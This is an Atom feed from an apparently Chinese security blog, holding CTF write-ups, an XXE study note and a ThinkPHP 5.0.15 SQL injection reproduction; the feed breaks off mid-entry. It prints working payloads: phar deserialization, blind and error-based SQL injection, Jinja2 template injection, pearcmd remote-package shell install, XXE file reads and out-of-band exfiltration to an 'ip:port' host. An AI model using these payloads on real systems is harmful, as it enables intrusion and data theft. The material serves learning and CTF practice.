<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>buxqm</title>
  
  
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-28T08:05:42.807Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Ycj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>极客巅峰+月饼赛</title>
    <link href="http://yoursite.com/2020/09/27/%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0/"/>
    <id>http://yoursite.com/2020/09/27/%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0/</id>
    <published>2020-09-26T16:00:00.000Z</published>
    <updated>2020-09-28T08:05:42.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BABYPHP2"><a href="#BABYPHP2" class="headerlink" title="BABYPHP2"></a>BABYPHP2</h1><p><a href="http://www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。" target="_blank" rel="noopener">www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。</a></p><p>链子还是比较简单的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Reader();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;backup=<span class="string">"/flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>使用compress.zlib://phar:// 绕过WAF，读取flag。</p><h1 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h1><p>过滤了单引号，使反斜杠绕过，sleep盲注获得admin密码登录后台。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;password=<span class="keyword">or</span> <span class="keyword">if</span>((ascii(substr((password),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">120</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>后台是一个eval($cmd.’=FALSE’)命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=<span class="keyword">require</span>%<span class="number">0</span>a~%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>?%<span class="number">3</span>E</span><br></pre></td></tr></table></figure><h1 id="meow-world"><a href="#meow-world" class="headerlink" title="meow world"></a>meow world</h1><p>根据提示 ，搜到了一篇文章<a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">CAMPCTF</a>，并且找到了pearcmd.php，读取源码 ，发现通过argv参数可以getshell。</p><p>由于启动了register_argc_argv ，argv可以直接通过GET传参获取，使用+可以分隔数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=pearcmd&amp;argv=<span class="number">1</span>+<span class="keyword">list</span></span><br></pre></td></tr></table></figure><p>此命令列出了已安装的pear软件包。 </p><p>根据文章中所述，可以通过install pear安装包上传shell，按照文章中打包好安装包，并放在自己的服务器下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=pearcmd&amp;argv=<span class="keyword">list</span>+install+--installroot+/tmp/+http:<span class="comment">//ip+port/upload.tar.gz</span></span><br></pre></td></tr></table></figure><p>成功安装，安装后的路径是由/tmp+pearcmd.php所在路径+doc+安装包内路径组成，通过报错获得pearcmd.php所在路径为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/<span class="keyword">eval</span></span><br></pre></td></tr></table></figure><p>成功getshell,使用蚁剑连接后台，还需要写一个计算题。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r =<span class="keyword">substr</span>($r,<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure><p>成功读取flag。</p><h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p>一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("cat /flag").read()'</span>) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h1 id="月饼赛"><a href="#月饼赛" class="headerlink" title="月饼赛"></a>月饼赛</h1><h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><p>第一关科学计数法造成浮点数溢出<code>payload=1e-199</code>。</p><p>第二关md2 0e弱比较</p><p>单次md2加密：0e652024452</p><p>两次md2加密：0e603448399</p><p>第三关：要求host必须含有ctfshow.com,使用文件夹路径绕过：a://ctfshow.com/../../../../../fl0g.txt </p><h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><p>第一关LIKE注入，发现没有过滤_，于是先用_爆出密码位数，然后一位一位爆破，进入第二关。</p><p>第二关命令执行，过滤了所有小写字母，使用环境变量$path构造出<code>nl ????.???</code>读取flag.php。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span> ????.???</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BABYPHP2&quot;&gt;&lt;a href=&quot;#BABYPHP2&quot; class=&quot;headerlink&quot; title=&quot;BABYPHP2&quot;&gt;&lt;/a&gt;BABYPHP2&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.zip源码泄露，审查源码发现文件上传和读取，可以构造</summary>
      
    
    
    
    <category term="专题  writeup" scheme="http://yoursite.com/categories/专题-writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>XML学习</title>
    <link href="http://yoursite.com/2020/06/30/XXE%E4%B8%93%E9%A2%98/"/>
    <id>http://yoursite.com/2020/06/30/XXE%E4%B8%93%E9%A2%98/</id>
    <published>2020-06-29T16:00:00.000Z</published>
    <updated>2020-09-28T08:35:08.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE学习记录"><a href="#XXE学习记录" class="headerlink" title="XXE学习记录"></a>XXE学习记录</h1><p>​    </p><p>​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。</p><h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： <code>&lt;!DOCTYPE 根元素名 [element-declarations]&gt;</code>，如果DTD位于XML源文件外，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>​    这个SYSTEM/PUBLIC关键字就是导致XXE注入的关键，经过研究JAVA解析DTD文件时，通过文件流将SYSTEM关键字后面的值当作URL读取文件，而JAVA文件流支持HTTP、FTP、JAR、FILE等等协议，在PHP中情况也类似，支持PHP伪协议、phar等等协议。</p><p>​    在DTD中可以定义通用实体和参数实体。</p><p>​    1、通用实体</p><p>​    通用实体能在XML文档中引用，示例代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    2、参数实体</p><p>​    参数实体只能在DTD文件中引用，示例代码如下：</p><p>test1.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % in1 SYSTEM &quot;test2.dtd&quot;&gt;</span><br><span class="line">%in1;%out;</span><br></pre></td></tr></table></figure><p>test2.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % out &quot;&lt;!ENTITY writer &apos;111&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure><p>​    关于DTD的基本知识就介绍到这里，接下来尝试一下XXE攻击，本文使用PHP环境。</p><h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>首先搭建一个简单的解析XML文档的PHP服务,目标是读取flag.php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建文档对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 </span><br><span class="line">    $creds = simplexml_import_dom($dom);<span class="comment">//将DOM对象转换成XML对象</span></span><br><span class="line">    <span class="keyword">echo</span> $creds;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们这里主要探讨Data协议</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p> <img src="https://i.loli.net/2020/07/02/XtAH16oLrYkhCTb.png" alt></p><p>经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。</p><p><img src="https://i.loli.net/2020/07/02/4rREZKu9dOz7JNv.png" alt></p><p>直接拼凑失败了，SYSTEM后面的%xxe;直接被当成url解析了，于是尝试分步拼凑。</p><p><img src="https://i.loli.net/2020/07/02/tBRa6jSh34fo9iZ.png" alt></p><p>发现报错PEReferences forbidden in internal subset in Entity PEReferences 指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体，那就用外部DTD试试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA=&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;file:///C:/phpStudy/PHPTutorial/WWW/out.dtd&quot;&gt;</span><br><span class="line">%out;%all;</span><br><span class="line"> ]&gt; </span><br><span class="line">&lt;root&gt;&amp;a;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>out.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY a SYSTEM &apos;%xxe;&apos;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure><p>理一下思路，首先在在payload中完成data协议信息读取，然后再外部dtd进行拼凑，最后再引用拼凑的实体进行文件读取，这样可以绕过许多WAF。</p><p><img src="https://i.loli.net/2020/07/02/n1PUFQfeqpm4SEk.png" alt></p><p>顺带一提，当文件中含有&gt;,%,&amp;等字符时，XML解析会报错，不能读取出文件内容，这是可以用CDATA来包裹文件内容，再CDATA中的数据不会被XML解析，也需要用到外部dtd，这里就直接放关键部分payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/3357#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-22</a> </p><p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE学习记录&quot;&gt;&lt;a href=&quot;#XXE学习记录&quot; class=&quot;headerlink&quot; title=&quot;XXE学习记录&quot;&gt;&lt;/a&gt;XXE学习记录&lt;/h1&gt;&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;​    XXE也就是XML外部实体注入，这主要是DTD文件导致的。&lt;/p</summary>
      
    
    
    
    <category term="XXE" scheme="http://yoursite.com/categories/XXE/"/>
    
    
  </entry>
  
  <entry>
    <title>TP5.0.24</title>
    <link href="http://yoursite.com/2020/06/30/TP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
    <id>http://yoursite.com/2020/06/30/TP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</id>
    <published>2020-06-29T16:00:00.000Z</published>
    <updated>2020-10-06T06:38:36.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TP5-0-漏洞复现"><a href="#TP5-0-漏洞复现" class="headerlink" title="TP5.0.*漏洞复现"></a>TP5.0.*漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在审计代码前，可以先看看<a href="https://www.kancloud.cn/manual/thinkphp5/122950" target="_blank" rel="noopener">开发手册</a>，大致了解一下框架结构能够使你更快入手。</p><h2 id="TP5-0-15SQL注入复现"><a href="#TP5-0-15SQL注入复现" class="headerlink" title="TP5.0.15SQL注入复现"></a>TP5.0.15SQL注入复现</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>使用composer安装TP5.0.15</p><p>composer能够更加方便、快速的安装准确的框架版本，windows环境在官网下载安装程序，选择PHP版本(最好是大于7.2)，安装时可以配置一下代理，不然会很慢。</p><p>安装好后执行</p><pre><code>composer create-project topthink/think tp 5.0.15</code></pre><p>更多的版本也可以在composer官网找到。</p><p>使用composer的好处是能够快速切换版本，只需要将framework改成你自己想要的版本，然后执行<code>composer update</code>就好了。</p><p><img src="https://i.loli.net/2020/10/04/EazP48swVgmC6pq.png" alt="image.png"></p><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>首先建立一个数据库tptest，然后建立一个user表，字段是id,username。</p><p><img src="/images/TP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/image-20201005191103224.png" alt="image-20201005191103224"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞触发点在执行数据插入的时候，所以先在index控制器创建一个插入数据的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public  function testsql()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = input(&apos;get.username/a&apos;);</span><br><span class="line">        db(&apos;user&apos;)-&gt;where([&apos;id&apos;=&gt; 1])-&gt;insert([&apos;username&apos;=&gt;$username]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CTP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86%5Cimage-20201005191717380.png" alt="image-20201005191717380"></p><p>报错注入成功。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>跟入insert方法，重点在生成sql语句的函数</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CTP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86%5Cimage-20201005192213389.png" alt="image-20201005192213389"></p><p>跟入<code>$this-&gt;builder-&gt;insert</code>方法</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CTP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86%5Cimage-20201005192349737.png" alt="image-20201005192349737"></p><p>跟进parseData方法，看看它是如何处理我们的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">         $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</span><br><span class="line">         <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</span><br><span class="line">             <span class="comment">// 对象数据写入</span></span><br><span class="line">             $val = $val-&gt;__toString();</span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</span><br><span class="line">             <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</span><br><span class="line">                 <span class="keyword">case</span> <span class="string">'exp'</span>:</span><br><span class="line">                     $result[$item] = $val[<span class="number">1</span>];</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 <span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">                     $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 <span class="keyword">case</span> <span class="string">'dec'</span>:</span><br><span class="line">                     $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>可以在用户手册看到说明，在thinkphp5.0.5加入了exp、inc、dec方法来处理数据，主要是为了方便字段的自增与自减，这里就是漏洞触发点。</p><p>由于没有对数据做任何过滤处理，处理完数据后，直接拼接成sql语句并执行，才导致报错注入的发生。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `user` (`username`) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1)</span><br></pre></td></tr></table></figure><p>我们可以注意到，与inc效果类似的关键字还有exp与dec，于是我们试一试这两个关键字能不能触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/public/index.php/index/index/testsql?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><p>dec关键字触发漏洞成功，但是exp关键字触发漏洞失败了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/public/index.php/index/index/testsql?username[0]=exp&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><p>经过调试，发现thinkphp对输入的数据进行了过滤，exp排在黑名单榜首。</p><p><img 